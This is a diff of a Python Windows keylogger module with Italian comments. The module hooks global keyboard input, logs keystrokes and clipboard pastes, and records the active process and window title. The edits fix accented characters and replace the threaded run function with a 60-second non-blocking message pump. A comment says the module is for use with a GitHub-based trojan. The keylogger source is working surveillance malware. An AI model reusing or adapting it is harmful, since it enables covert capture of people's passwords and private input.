@@ -3,7 +3,7 @@
 # print come in py 3.5
 from __future__ import print_function
 
-# tipi c servirà per poter comunucare con kernel e api dei processi
+# tipi c servira' per poter comunucare con kernel e api dei processi
 from ctypes import *
 # PythonCOM: un framework per sviluppare applicazioni COM e per utilizzare i componenti COM preesistenti da Python.
 import pythoncom
@@ -13,8 +13,7 @@ import win32clipboard
 import pyHook
 
 # per la chiusura
-import threading
-import os, time
+import sys, time
 
 # dichiariamo alcuni oggetti usati di seguito
 # gestisce le finestre
@@ -36,7 +35,7 @@ def get_current_process():
     # cerca l'ID del processo
     # con ctypes ne dichiariamo il tipo
     pid = c_ulong(0)
-    # poi lo passiamo a lla funzione che ne cambierà il valore
+    # poi lo passiamo a lla funzione che ne cambiera' il valore
     user32.GetWindowThreadProcessId(hwnd, byref(pid))
 
     # salva l'ID trovato in precedenza
@@ -47,7 +46,7 @@ def get_current_process():
     executable = create_string_buffer("\x00" * 512)
     # troviamo h_process tramite il PID, quindi deve essere passato alla successiva funzione per ottenere in nome dell'eseguibile
     h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid)
-    # passiamo tuto alla funzione che ne restituirà il nome dell'eseguibile
+    # passiamo tuto alla funzione che ne restituira' il nome dell'eseguibile
     psapi.GetModuleBaseNameA(h_process,None,byref(executable),512)
 
     # leggiamone il titolo
@@ -67,15 +66,15 @@ def get_current_process():
 
 # funzione che gestisce la pressione dei tasti e il copia e incolla
 def KeyStroke(event):
-    # prendiamo il valore da globale: a inizio esecuzione è None
+    # prendiamo il valore da globale: a inizio esecuzione e' None
     global current_window
     
-    # se il processo è diverso lanciamo get_current_process
+    # se il processo e' diverso lanciamo get_current_process
     if event.WindowName != current_window:
         current_window = event.WindowName        
         get_current_process()
 
-    # se è stato premuto un caratte standard lo stampiamo
+    # se e' stato premuto un caratte standard lo stampiamo
     if event.Ascii > 32 and event.Ascii < 127:
         print (chr(event.Ascii), end='')
     else:
@@ -104,22 +103,24 @@ def main():
     # registra l'hook e fa partite il loop
     kl.HookKeyboard()
     # Un'applicazione che desideri ricevere notifica riguardo agli eventi input globali deve avere un Windows message pump.
-    # un modo per ottenerlo è usare il metodo PumpMessages di pythoncom
-    pythoncom.PumpMessages()
-    # grazie a questo l'input globale può essere gestito da kl.HookKeyboard()
+    # un modo per ottenerlo e' usare il metodo PumpMessages di pythoncom
+    # pythoncom.PumpMessages()
+    # grazie a questo l'input globale puo' essere gestito da kl.HookKeyboard()
 
 
-
-def run(**args):
     # dobbiamo dare un tempo finito al modulo per usarlo con il trojan github
     #facciamo partire la thread
+    # usiamo pythoncom.PumpWaitingMessages() che non è bloccante
+    while time.clock() < 60:
+        # registriamo per un poco
+        pythoncom.PumpWaitingMessages()
 
-    t = threading.Thread(target = main, args =())
-    t.start()
-
-    # registriamo per un poco
-    time.sleep(120)
-    print ('[*] Exiting...')
+    
+    
+    
     # usciamo
-    os._exit(0)
+    print ('[*] Exiting...')
+    return
+    #sys.exit()
+    
 
